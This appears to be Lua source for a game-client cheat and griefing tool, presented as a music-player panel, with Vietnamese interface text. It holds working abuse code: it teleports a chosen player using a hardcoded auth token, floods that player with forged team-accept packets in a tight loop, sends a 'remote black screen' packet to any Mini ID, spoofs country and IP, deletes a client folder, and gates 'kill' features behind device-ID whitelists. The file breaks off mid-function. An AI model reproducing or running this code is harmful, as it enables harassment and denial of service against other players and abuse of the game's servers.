		ShowGameTipsWithoutFilter("#cff0000Bật thành công")

GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 全局循环控制开关
_G.teleTeamLoopSwitch = false

-- 总控制弹窗
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng toàn bộ vòng lặp\nBên phải bật và chọn người chơi mục tiêu trước",
    "Công cụ dịch chuyển, lập đội và gửi phản hồi",
    nil,
    function(userData, btnType)
        if btnType == 0 then
            -- 停止逻辑
            _G.teleTeamLoopSwitch = false
            ShowGameTipsWithoutFilter("#cFF0000 Đã dừng toàn bộ vòng lặp gửi gói")
            return
        elseif btnType == 1 then
            -- 防止重复运行
            if _G.teleTeamLoopSwitch then
                ShowGameTipsWithoutFilter("#cFF7aad Tác vụ đang chạy, không bật lặp lại")
                return
            end
            -- 校验是否在游戏房间
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000 Hãy vào phòng game trước!")
                return
            end

            -- 加载房间玩家列表
            LoadHomelandLuas()
            local uin_list = GetPlayerUinList()
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000 Phòng hiện tại không có người chơi khác")
                return
            end

            -- 组装玩家列表UI数据
            local data = {
                visit = {
                    history_num = "Chọn người chơi mục tiêu để thao tác",
                    today_num = "#cFF7aad Tổng số người trong phòng:"..#uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end

            -- 打开玩家选择面板
            GetInst("UIManager"):Open("HomeEventRecord")
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            ctrl:UpdateUI(data)
            -- 修改界面文字
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi mục tiêu")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad Người chơi đang trực tuyến trong phòng")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad Nhấn vào người chơi để bắt đầu quy trình")

            -- 备份原点击函数
            local oldClickFunc = ctrl.EnterFriendHomeBtn_OnClick
            -- 重写点击事件：选中玩家后执行全套逻辑
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家选择面板
                GetInst("UIManager"):Close("HomeEventRecord")
                -- 还原原始点击函数，避免冲突
                ctrl.EnterFriendHomeBtn_OnClick = oldClickFunc

                -- 获取选中玩家uin
                local targetUin = this:GetClientID()
                ShowGameTipsWithoutFilter("#c00ffff Đã chọn người chơi mục tiêu:"..targetUin)

                -- 标记循环开启，放入异步线程防止UI卡死
                _G.teleTeamLoopSwitch = true
                threadpool:work(function()
                    -- ========== 1、跨地图传送代码 ==========
                    GameVmTriggerInit()
                    local selfUin = targetUin
                    local content = '{"mapid":"66336934704562","body":"uin=889750811&ts=1723499823&country=CN&apiid=110&game_session_id=&s2t=1723498072&cltapiid=1&version=1.7.8&cltversion=67336&session_id=&env=0&log_id=&language=0&auth=b33f76eb8b37091e88c963d666f182a6","members":['..selfUin..'],"pos":{}}'
                    
                    SandboxMgr:sendToHost('MULTI_MAP_TELEPORT_TOHOST',content)
                    ShowGameTipsWithoutFilter("#c00ffff Đã gửi xong lệnh dịch chuyển bản đồ")
threadpool:wait(3.0)
                    -- ========== 2、创建私密6人队伍 ==========
                    GetClientGameManagerPtr():gotoGame("MainMenuStage")
                    local param = {
                        member_max = 6,
                        is_private = 1,
                        gender = 0,
                        name = ""
                    }
                    GetInst("TeamupPreSetService"):ReqCreateTeamSync(param, selfUin)
                    threadpool:wait(1.0) -- 等待队伍创建完成
                    ShowGameTipsWithoutFilter("#c00ffff Tạo đội riêng tư thành công")

                    -- ========== 3、循环向选中玩家发送组队同意回执 ==========
                    local teamSvr = GetInst("TeamupService")
                    local loopCount = 0
                    while _G.teleTeamLoopSwitch do
                        loopCount = loopCount + 1
                        local sendData = {
                            code = 0,
                            teamid = teamSvr:GetTeamID()
                        }
                        -- 单发接口route，修复routemore数字参数报错
                        AccountManager:route("SocialHallDataMgr.organize_team_resp", targetUin, sendData)

                        -- 每10次弹窗提示
                        
                        threadpool:wait(0.000001) -- 发包间隔，防限流
                    end

                    -- 循环终止收尾提示
                    ShowGameTipsWithoutFilter("#cFF0000 Vòng lặp đã dừng, tổng số phản hồi đã gửi:"..loopCount.." lần")
                end)
            end
        end
    end
)

return
	end



	if song_id == 99989 or song_id == "99989" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")

ShowTextInputSafe(function(text)
        -- 验证输入的迷你号是否有效
        local target = tonumber(text)
        if not target or target <= 1000 then
            ShowGameTipsWithoutFilter("#cff0000Mini ID không hợp lệ (phải lớn hơn 1000)", 3)
            return
        end
        
        -- 循环执行踢人（这里原代码是固定循环10000次）
        
            AccountManager.cluster.buddysvr.routemore('data.capture',target,54188)
            ShowGameTipsWithoutFilter("#RMàn hình đen từ xa", 3)  -- 这条提示会刷屏，建议移到外面
        
    end, "Nhập Mini ID")
    end

	
	-- 真实歌曲
	self:GetMusicDetailInfo(song_id, function(item)
		if not item then
			return
		end
		self:OnSynMusicList(cmd, function()
			self:RefreshLeftList()
			self:RefreshMusicList()
			self.view:showData()
		end)
		-- 不保存到最近播放
	end)
end

function QQMusicTriggerCtrl:Refresh()
	self.model:SetIsCloseUI(false)
	if not self.schedulerKey then
		self.lastTime = os.time()
		self.schedulerKey = GetInst("MiniUIScheduler"):regGloabel(function()
			self:DoUpdate()
		end, 0.1, 864000000, nil, false)
	end
	local listType = self.model:GetListType()
	self.view:RefreshLeftList(listType, self.define.leftInfos, self.OnClickLeftItem)
	self:OnClickLeftItem(listType)
end


-- 点击搜索按钮，执行歌曲搜索
function QQMusicTriggerView:OnSearchMusic()
	if self.model:IsCloseUI() then
		return
	end
	if self.widget.searchEdit then
		local text = self.widget.searchEdit:getText()
		if self.parent then
			self.widget.musicList:setNumItems(0) -- 清空旧列表
			-- ===== 改成搜索功能 =====
			self.parent:SearchFunction(text) -- 调用控制器的搜索功能
			-- =========================
			self.widget.searchText:setText(GetS(13078, text))
		end
	end
end

function QQMusicTriggerCtrl:SearchFunction(text)
	if not text or text == "" then
		self:RefreshMusicList()
		return
	end
	
	local searchText = string.lower(text)
	local results = {}
	local resultIds = {}
	
	-- 搜索推荐列表
	local recommendList = self.model:GetMusicList(self.model.LISTTYPE.RECOMMEND)
	if recommendList then
		for i, song in ipairs(recommendList) do
			local detail = self.model:GetMusicDetailByID(song.song_id)
			if detail and detail.song_name then
				local name = string.lower(tostring(detail.song_name))
				if string.find(name, searchText, 1, true) then
					if not resultIds[song.song_id] then
						table.insert(results, {song_id = song.song_id})
						resultIds[song.song_id] = true
					end
				end
			end
		end
	end
	
	-- 搜索最近播放列表
	local nearList = self.model:GetMusicList(self.model.LISTTYPE.NEAR)
	if nearList then
		for i, song in ipairs(nearList) do
			local detail = self.model:GetMusicDetailByID(song.song_id)
			if detail and detail.song_name then
				local name = string.lower(tostring(detail.song_name))
				if string.find(name, searchText, 1, true) then
					if not resultIds[song.song_id] then
						table.insert(results, {song_id = song.song_id})
						resultIds[song.song_id] = true
					end
				end
			end
		end
	end
	
	
	
	-- 显示搜索结果
	if #results > 0 then
		self.view:RefreshMusicList(results, self.model.LISTTYPE.SEARCH)
		self.view.widget.searchText:setText("Kết quả tìm kiếm:" .. #results .. " mục")
	else
		ShowGameTipsWithoutFilter("Không tìm thấy chức năng liên quan")
		self:RefreshMusicList()
	end
end

-- 底部播放按钮点击回调，切换播放/暂停状态
function QQMusicTriggerView:bouttonState()
	if self.model:IsCloseUI() then
		return
	end
	if self.widget.bouttonPlay:getController("ButtonPlay"):getSelectedIndex() == self.BUTTONSTATE.STOP then
		-- 播放
		self:RefreshButtonState(self.model.PLAYSTATE.PLAY)
		QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/096d816716f4f311fd3a78d9f2dfd3fc.mp3", 0)
	else
		-- 暂停
		self:RefreshButtonState(self.model.PLAYSTATE.STOP)
		if QQMusicPlayerIns then
			QQMusicPlayerIns:PauseMusicOperate()
		end
	end
end


function QQMusicTriggerView:RenderItemNode(idx, obj)
	if self.model:IsCloseUI() then
		return
	end
	idx = idx or arg1
	idx = idx + 1
	obj = tolua.cast(obj, "miniui.GButton")
	local itemNode = obj or tolua.cast(arg2, "miniui.GButton")
	local showMark = self.musicCount == idx
	
	-- ===== 关键修改：直接用 dataList 获取数据 =====
	local data = nil
	if self.currentDataList and idx <= #self.currentDataList then
		local songId = self.currentDataList[idx]
		if type(songId) == "table" then
			songId = songId.song_id
		end
		data = self.parent:GetMusicByID(songId)
	end
	-- ============================================
	
	if self.parent then
		self:RefreshMusicListItem(itemNode, idx, data, showMark)
	end
	if showMark then
		local isSelect = itemNode:getChild("select")
		if isSelect then
			isSelect:setVisible(false)
		end
	end
end



function QQMusicTriggerView:RefreshMusicList(dataList, listType)
	if self.model:IsCloseUI() then
		return
	end
	
	-- ===== 保存当前数据列表供 RenderItemNode 使用 =====
	self.currentDataList = dataList
	-- ================================================
	
	local count = #dataList
	self.musicCount = 0 < count and count + 1 or count
	self.widget.musicList:setNumItems(self.musicCount)

	if #dataList == 0 then
		self.widget.notipText:setVisible(true)
		self.widget.notipImage:setVisible(true)
	else
		self.widget.notipText:setVisible(false)
		self.widget.notipImage:setVisible(false)
	end

	if self.model.LISTTYPE.SEARCH == listType then
		self.controllerSearch:setSelectedIndex(self.SEARCHSTATE.SEARCH)
	else
		self.controllerSearch:setSelectedIndex(self.SEARCHSTATE.NORMAL)
	end

	local playingData = self.parent:GetPlayingMusic()
	self.widget.bouttonPlay:setTouchable(playingData ~= nil)
end




function QQMusicTriggerView:RefreshMusicListItem(item, index, data, showMark)
	if self.model:IsCloseUI() then
		return
	end
	if item then
		-- 隔行变色背景
		local bkg = item:getChild("bkg")
		-- 排名数字
		local rank = item:getChild("trank")
		-- 歌曲名称文本
		local musicName = item:getChild("tmusicName")
		-- 时长文本
		local authorName = item:getChild("tauthorName")
		-- 播放中图标（播放时替换排名数字）
		local playIcon = item:getChild("playIcon")
		-- 每行右侧【试听】按钮（你截图黄色按钮）
		local buttonSelect = item:getChild("bouttonSelect")
		-- 末尾空白行分隔标记
		local mark = item:getChild("qqmark")
		-- 歌曲选中高亮遮罩
		local isSelect = item:getChild("select")

		-- 隔行背景控制，末尾空白行取消背景
		
		
		if buttonSelect then
	buttonSelect:setText("Bật")
	
end
	
		
if bkg then
	-- 全部显示青色背景
	bkg:setVisible(true)
	if showMark then
		bkg:setVisible(false)  -- 空白行还是隐藏
	end
end

		-- 空白行隐藏排名、显示分割标记
		if rank then
		rank:setColor({r = 255, g = 0, b = 0})
			rank:setVisible(not showMark)
			rank:setText("VIP")
		end
		if mark then
			mark:setVisible(showMark)
		end
		if musicName then
			musicName:setVisible(not showMark)
		end
		if authorName then
			authorName:setVisible(not showMark)
		end
		if buttonSelect then
			buttonSelect:setVisible(not showMark)
		end

		-- 有歌曲数据才渲染内容
		if data then
			item:setCustomData(data.song_id) -- 将歌曲ID绑定到条目控件
			-- 不可播放歌曲整体半透明、按钮禁用
			local alhpa = data.playable == 1 and 1 or 0.5
			if data.playable ~= 1 then
				item:setCustomData(0)
			end
			 --所有文字+按钮统一透明度
			rank:setAlpha(alhpa)
			musicName:setAlpha(alhpa)
			authorName:setAlpha(alhpa)
			buttonSelect:setAlpha(alhpa)
			buttonSelect:setTouchable(data.playable == 1)

			item:setVisible(data ~= nil or showMark)
			-- 拼接歌曲名-歌手名，超长文字截断加省略号
			if musicName and data.song_name and data.singer_name then
				local showName = tostring(data.song_name) .. " - " .. tostring(data.singer_name)
				local strLength, bDefault = getStringLength(showName, 48)
				if bDefault then
					showName = string.sub(showName, 1, strLength) .. "..."
				end
				musicName:setText(showName)
			end
			-- 格式化歌曲时长显示
			if authorName then
				local musicTime = self:FormatTime(data.song_play_time)
				authorName:setText(tostring(musicTime))
			end

			-- 给【试听按钮】绑定点击事件，点击试听+添加歌曲到待选列表
			if buttonSelect then
				-- 先移除旧事件，防止列表复用时重复绑定
				if buttonSelect.buttonkey then
					GetInst("MiniUIEventDispatcher"):removeEventListener(buttonSelect, buttonSelect.buttonkey)
					buttonSelect.buttonkey = nil
				end
				-- 注册新点击事件
				buttonSelect.buttonkey = GetInst("MiniUIEventDispatcher"):addEventListener(buttonSelect, UIEventType_Click, function(obj, context)
					self.data.musicPlayTime = 0 -- 重置播放进度
					self:RefreshButtonState(self.model.PLAYSTATE.PLAY) -- 更新播放按钮UI
					self:OnPlayIcon(obj, index) -- 设置当前播放歌曲
					self:showData() -- 刷新底部歌曲信息
					self.parent:OnAddMusic(data.song_id, data) -- 核心：调用控制器添加歌曲
					self.widget.bouttonPlay:getController("ButtonPlay"):setSelectedIndex(self.BUTTONSTATE.PLAY)
				end)
			end

			if index >= self.musicCount then
				return
			end
			-- 当前选中歌曲显示高亮遮罩
			local selectData = self.parent:GetSelectMusic()
			if selectData then
				if data.song_id == selectData.song_id then
					isSelect:setVisible(true)
				else
					isSelect:setVisible(false)
				end
				self.list[data.song_id] = item
			else
				isSelect:setVisible(false)
			end

			-- 正在播放的歌曲替换播放图标，隐藏排名数字
			local playingData = self.parent:GetPlayingMusic()
			if playingData then
				if data.song_id == playingData.song_id and index < self.musicCount then
					local state = self.model:GetPlayState()
					if state == self.model.PLAYSTATE.PLAY then
						playIcon:setPlaying(true)
					else
						playIcon:setPlaying(false)
					end
					playIcon:setVisible(true)
					rank:setVisible(false)
					if self.loadingState then
						playIcon:setPlaying(false)
					end
				else
					playIcon:setVisible(false)
					rank:setVisible(true)
				end
			else
				playIcon:setVisible(false)
			end
		end
		-- 末尾空白行隐藏选中标记
		if showMark then
			isSelect:setVisible(false)
		end
	end
end

-- 切换加载中状态，显示/隐藏加载转圈
function QQMusicTriggerView:SetLoading(state)
	self.loadingState = state
	-- 不显示加载转圈
	-- self.widget.loadingbkg:setVisible(state)
	-- self.widget.loading:setVisible(state)
	self:showData()
end


function QQMusicTriggerView:InitUI(param)
	-- 本地数据缓存
	self.data = {}
	self.data.musicAllTime = 0     -- 当前播放歌曲总时长
	self.data.musicPlayTime = 0    -- 当前已播放时长
	self.data.interval = 0         -- 刷新时间戳间隔
	self.data.loadingSpeed = 10    -- 加载转圈旋转速度

	self.parent = param.parent     -- 绑定上层Controller控制器（父层，处理业务逻辑）
	self.model = param.model       -- 绑定Model数据层（存储歌单、播放状态）
	self.widget = {}               -- 所有FGUI控件统一缓存容器
	self.list = {}                 -- 歌曲ID与Item控件映射表
	self.sureData = {}             -- 待批量添加的歌曲缓存

	-- 1、获取弹窗根容器m_player
	self.widget.player = self.root:getChild("m_player")
	-- 遮罩层（点击空白关闭弹窗）
	self.widget.mask = self.root:getChild("m_mask")

	-- 按钮状态枚举：0停止，1播放
	self.BUTTONSTATE = {STOP = 0, PLAY = 1}
	-- 搜索栏状态枚举：0正常，1搜索模式
	self.SEARCHSTATE = {NORMAL = 0, SEARCH = 1}

	-- 左侧分类列表（推荐音乐/最近试听）
	self.widget.leftList = self.widget.player:getChild("tleftList")
	-- 中间歌曲虚拟列表（展示所有歌曲条目）
	self.widget.musicList = self.widget.player:getChild("tmusicList")
	if self.widget.musicList then
		-- 绑定列表条目点击事件
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.musicList, UIEventType_ClickItem, function(obj, context)
			self:OnClickMusicItem(context)
		end)
		-- 绑定列表渲染器回调，虚拟列表每生成一行Item都会执行RenderItemNode
		GetInst("MiniUIComponents"):setCallback(self.widget.musicList, "GList.itemRenderer", function(comp, idx, obj)
			self:RenderItemNode(idx, obj)
		end)
		-- 绑定列表滚动事件，用于下拉加载更多搜索歌曲
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.musicList, UIEventType_Scroll, function(obj, context)
			self:OnListScroll(context)
		end)
		-- 开启虚拟列表优化，只渲染可视区域条目，节省性能
		self.widget.musicList:setVirtual()
	end

	-- 右上角关闭按钮 X
	self.widget.bouttonClose = self.widget.player:getChild("bouttonClose")
	if self.widget.bouttonClose then
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.bouttonClose, UIEventType_Click, function(obj, context)
			-- 调用父控制器关闭窗口逻辑
			if self.parent and self.parent.OnClose then
				self.parent:OnClose()
			end
		end)
	end

	-- 点击灰色遮罩关闭弹窗
	if self.widget.mask then
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.mask, UIEventType_Click, function(obj, context)
			self.parent:OnClose()
		end)
	end

	-- 右下角【确定】批量添加歌曲按钮
	self.widget.bouttonSure = self.widget.player:getChild("bouttonSure")
	if self.widget.bouttonSure then
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.bouttonSure, UIEventType_Click, function(obj, context)
			self:OnClickMusicSure()
		end)
	end

	-- 底部中央播放/暂停总按钮
	self.widget.bouttonPlay = self.widget.player:getChild("buttonPlay")
	if self.widget.bouttonPlay then
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.bouttonPlay, UIEventType_Click, function(obj, context)
			local playingData = self.parent:GetPlayingMusic() -- 当前正在播放歌曲
			local selectData = self.parent:GetSelectMusic()    -- 当前选中歌曲
			self:bouttonState() -- 切换播放/暂停UI状态
			-- 如果选中歌曲=正在播放歌曲，刷新底部歌曲信息
			if playingData.song_id == selectData.song_id then
				self:showData()
			end
		end)
	end

	-- 下一曲按钮（当前隐藏未启用）
	self.widget.bouttonNext = self.widget.player:getChild("buttonNext")
	self.widget.bouttonNext:setVisible(false)

	-- 歌曲封面图标
	self.widget.musicIcon = self.widget.player:getChild("musicIcon")
	if self.widget.musicIcon then
		-- 设置默认封面资源
		self.widget.musicIcon:setIcon("https://www.panurl.cn/view.php/622a81c1c9f07c35845def16ed75209a.png")
		self.oldIcon = self.widget.musicIcon:getIcon() -- 缓存默认封面
		-- 设置圆形遮罩，把方形封面切成圆形
		self.widget.musicIcon:setMaskTexture("miniui/miniworld/QQMusicPlayer_HeadMask.png")
	end

	-- 搜索栏父容器
	self.widget.search = self.widget.player:getChild("search")
	-- 搜索按钮（放大镜）
	self.widget.buttonSearch = self.widget.search:getChild("buttonSearch")
	-- 搜索输入框
	self.widget.searchEdit = self.widget.search:getChild("edit")
	if self.widget.buttonSearch then
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.buttonSearch, UIEventType_Click, function(obj, context)
			self:OnSearchMusic()
		end)
	end

	-- 清空搜索按钮（X）
	self.widget.buttonSearchClose = self.widget.player:getChild("buttonSearchClose")
	GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.buttonSearchClose, UIEventType_Click, function(obj, context)
		self:OnSearchClose()
	end)

	-- 搜索状态切换控制器（控制界面文字/布局切换）
	self.controllerSearch = self.widget.player:getController("SearchStatus")
	-- 搜索结果提示文本
	self.widget.searchText = self.widget.player:getChild("searchText")
	-- 列表为空时提示文字：列表为空，请选择要播放的歌曲
	self.widget.notipText = self.widget.player:getChild("notipText")
	self.widget.notipText:setText(GetS(37037))
	-- 列表为空占位图片
	self.widget.notipImage = self.widget.player:getChild("notipImage")
	-- 加载遮罩背景
	self.widget.loadingbkg = self.widget.player:getChild("loadingbkg")
	-- 加载旋转图标
	self.widget.loading = self.widget.player:getChild("loading")
	-- 底部歌曲名称文本
	self.widget.musicName = self.widget.player:getChild("musicName")
	self.widget.musicName:setText("Chào mừng VIP Vàng cao quý") -- 默认文字：加载中...
end


-- 刷新底部歌曲名称、总时长、封面
function QQMusicTriggerView:showData()
	if self.model:IsCloseUI() then
		return
	end
	local data = self.parent:GetPlayingMusic()
	-- 拼接歌名歌手
	local showName = tostring(data.song_name) .. " - " .. tostring(data.singer_name)
	self.widget.musicName:setText(showName)
	if self.loadingState then
		self.widget.musicName:setText("Chào mừng VIP Vàng cao quý")
	end
	self.data.musicAllTime = data.song_play_time
	self:RefreshTime()
	-- 加载歌曲封面图
	local picData = self.parent:GetMusicByID(data.song_id)
	if picData then
		self.parent:loadAlbumPic(picData)
	end
end

-- 帧更新核心逻辑：每分每秒刷新时间
function QQMusicTriggerView:DealProgress(deltaTime)
	-- 每0.5秒刷新一次时间（北京时间和播放进度）
	self.data.interval = self.data.interval + deltaTime
	if self.data.interval >= 0.5 then
		self:RefreshTime()
		self.data.interval = 0
	end
end




function QQMusicTriggerView:RefreshTime()
	if self.model:IsCloseUI() then
		return
	end
	
	-- 获取北京时间
	local function getBeijingTime()
		local now = os.time()
		local utcOffset = os.difftime(now, os.time(os.date("!*t", now)))
		local beijingOffset = 8 * 3600
		local beijingTime = now + beijingOffset - utcOffset
		return os.date("%H:%M:%S", beijingTime)
	end
	
	if self.widget.player:getChild("musicTime") then
		-- 显示北京时间
		self.widget.player:getChild("musicTime"):setText(getBeijingTime())
	end
end



    
-- 获取当前设备ID









--=====================================================
--====================================================================

if not jdjsjsjsn then
  
    gFunc_deleteStdioDir(filepath_root..'axdx')
    ShowGameTipsWithoutFilter("#cFF7aadChào mừng sử dụng Bánh Mì") 
    MessageBox(4, '#KThông báo công cụ\n\n#RKỳ nghỉ hè đã đến, công cụ được chia sẻ miễn phí cho mọi người, mong mọi người ủng hộ', function(btn)
end)
   local country = "VN"
gFunc_setCountry(country)
gFunc_setCountryIP(country)
    local a = GetClientInfo():getDeviceID()
    GetClientInfo():clickCopy(a)


    jdjsjsjsn = true
    
end





-- 打开歌曲列表主面板（点击悬浮球调用）








-- 打开歌曲列表主面板（点击悬浮球调用）










-- ==================== 全局变量声明 ====================
-- 功能开关变量
kick_loop_enabled = false
kick_target = 0
is_kq_enabled = false
is_attack_enabled = false
attack_loop_running = false
is_skybox_enabled = false
skybox_loop_running = false
is_time_speed_enabled = false
time_speed_loop_running = false
current_time_speed = 100
ydfh_all_1 = false
wdtz_all_1 = false
jdfk_all_1 = false
    -- 在脚本开头的全局变量区添加
kick_timer = nil
if syntaxcheck then return end

-- 确认框回调存储
local currentConfirmCallback = nil

-- 通用特效列表
local commonNameList = {
    "ice_qicaihua_01", "140113_1", "pumpkin_fireworks2", "horse_3437",
    "horse_4506_3", "horse_4662_3","horse_4502","horse_4564_3","horse_4645_3","horse_4616_3","horse_4554_3","horse_3457","horse_4503"
}

local effectNameList = {
    "bossblock_jinghua", "horse_4506_3", "horse_4662_3", "music01",
    "music02", "boss_10069_hq", "bossskill_3514_white", "bossblock_room"
}
---vip保护白名单列表
local whitelist = {
    [131483475] = true,  -- 作者自己
    [1320581402] = true,  -- 其他VIP
    [1320578970] = true,
     [1320581140] = true,
     [1088712050] = true,
     [1224924207] = true,
     [1006666666] = true,
     [1000010001] = true,
     [1010000000] = true,
     [1320666484] = true,
     [1320044286] = true,
     [1010000000] = true,
     [1320647882] = true,
     [1009444444] = true,
     [1320783322] = true,
     [1321002678] = true,
     [1320993972] = true, 
     [1321002678] = true,
     [1321061356] = true,
     [1321067646] = true,
     [1320771921] = true,
     
     
}

---作者专属
local author = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,  -- 你的设备ID
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
    ["9c87144faf65f385bee20929d6e3e7eb"] = true,
    ["1afdd486624e54dcb903315d1407ce35"] = true,
        ["2d7e0e6b59015924363be9262fc378c7"] = true,
    ["191c6f9db55106d4140d6f5220a8cd36"] = true,
}


--vip特殊功能
local deviceWhitelist = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,  -- 你的设备                    -- 添加更多设备
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,
    ["3fecbaa4b9c6d4220095ac26deac3446"] = true,
        ["e8ad3d874429b833621de44d11cccfce"] = true,
        ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["9c87144faf65f385bee20929d6e3e7eb"] = true,
            ["1afdd486624e54dcb903315d1407ce35"] = true,
                ["2d7e0e6b59015924363be9262fc378c7"] = true,
                        ["191c6f9db55106d4140d6f5220a8cd36"] = true,
}



--防电脑秒
local author1 = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["2d7e0e6b59015924363be9262fc378c7"] = true,

}


--防电脑秒
local author2 = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
     ["2d7e0e6b59015924363be9262fc378c7"] = true,
         ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,

}

--全体循环秒
local author3 = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["2d7e0e6b59015924363be9262fc378c7"] = true,
        ["2284226b84d8e849a69326db5bbb217d"] = true,
                ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,

}
---秒杀白名单
local author4 = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["1afdd486624e54dcb903315d1407ce35"] = true,
            ["91f23e91dd107a4d51f26368e63a62ae"] = true,
            ["a97a1dd9aed672208883d57bb294ec83"] = true,
                    ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,

}


---自定义投掷物
local author5 = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,  
    ["c432ca63425e9d39bcfcbc14e215ed17"] = true,
    ["2284226b84d8e849a69326db5bbb217d"] = true,
            ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,

}

----c币功能
local author6 = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["f3e1bb45ada801c61b13a618fdc2f8c2"] = true,
        ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,

}

----超级功能
local author7 = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
        ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,
             ["f3e1bb45ada801c61b13a618fdc2f8c2"] = true,
                     ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,
                     ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,

}


local author8 = {
    ["WINb0ef9f493c3791d3dd4ff7477394c053"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
        ["1afdd486624e54dcb903315d1407ce35"] = true,
                ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,
        ["a97a1dd9aed672208883d57bb294ec83"] = true,
           

}



-- ==================== 修复后的ShowPlayerList函数 ====================
-- 增强版ShowPlayerList，支持异步回调、空玩家判断和取消回调
function ShowPlayerList(callback, title, onCancel)
    LoadHomelandLuas()
    local uin_list = GetPlayerUinList()
    
    -- 如果没有其他玩家，直接返回并触发取消回调
    if #uin_list == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
        if onCancel then 
            xpcall(onCancel, function(err) end)
        end
        return false
    end
    
    local data = {
        visit = { 
            history_num = title or "Chức năng", 
            today_num = "#cFF7aad" .. #uin_list 
        },
        event_home = { { param1 = 0, event_id = 5, event_time = 0 } },
        event_visit = {}
    }
    
    for i = 1, #uin_list do
        table.insert(data.event_visit, { uin = uin_list[i], event_id = 5, event_time = 0 })
    end
    
    local UIMgr = GetInst("UIManager")
    UIMgr:Open("HomeEventRecord")
    UIMgr:GetCtrl("HomeEventRecord"):UpdateUI(data)
    
    getglobal("HomeEventRecordTitleFrameName"):SetText("Danh sách thành viên phòng")
    getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadSố lượng người chơi")
    getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadChức năng hiện tại")
    
    -- 保存回调到全局变量
    _G._tempPlayerCallback = callback
    _G._tempPlayerCancel = onCancel
    _G._tempPlayerTitle = title
    
    local HomeEvent = UIMgr:GetCtrl("HomeEventRecord")
    
    -- 重写进入按钮点击事件
    function HomeEvent:EnterFriendHomeBtn_OnClick()
        UIMgr:Close("HomeEventRecord")
        local selectedUin = this:GetClientID()
        ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. selectedUin)
        
        if _G._tempPlayerCallback then
            local cb = _G._tempPlayerCallback
            local t = _G._tempPlayerTitle
            -- 清空全局变量
            _G._tempPlayerCallback = nil
            _G._tempPlayerCancel = nil
            _G._tempPlayerTitle = nil
            -- 执行回调
            xpcall(function() 
                cb(selectedUin, t) 
            end, function(err)
                ShowGameTipsWithoutFilter("#cFF0000Lỗi khi thực thi callback:" .. tostring(err))
            end)
        end
    end
    
    -- 添加关闭处理
    local originalOnClose = HomeEvent.OnClose
    function HomeEvent:OnClose(...)
        if _G._tempPlayerCancel then
            local cancel = _G._tempPlayerCancel
            -- 清空全局变量
            _G._tempPlayerCallback = nil
            _G._tempPlayerCancel = nil
            _G._tempPlayerTitle = nil
            -- 执行取消回调
            xpcall(cancel, function(err) end)
        end
        if originalOnClose then
